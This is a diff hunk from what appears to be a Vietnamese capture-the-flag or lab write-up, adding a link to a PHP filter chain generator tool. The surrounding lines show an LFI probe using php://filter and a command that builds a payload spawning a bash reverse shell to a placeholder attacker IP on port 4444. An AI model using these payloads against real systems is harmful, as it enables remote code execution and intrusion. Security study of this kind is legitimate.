@@ -36,7 +36,7 @@
   http://<ip>/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php
   ```
 * Thấy được code PHP gốc → LFI confirmed.
-* Tạo payload RCE bằng tool `php_filter_chain_generator.py`:
+* Tạo payload RCE bằng tool [`php_filter_chain_generator.py`](https://github.com/synacktiv/php_filter_chain_generator):
 
   ```bash
   python3 php_filter_chain_generator.py --chain '<?php system("bash -c \"bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1\""); ?>'
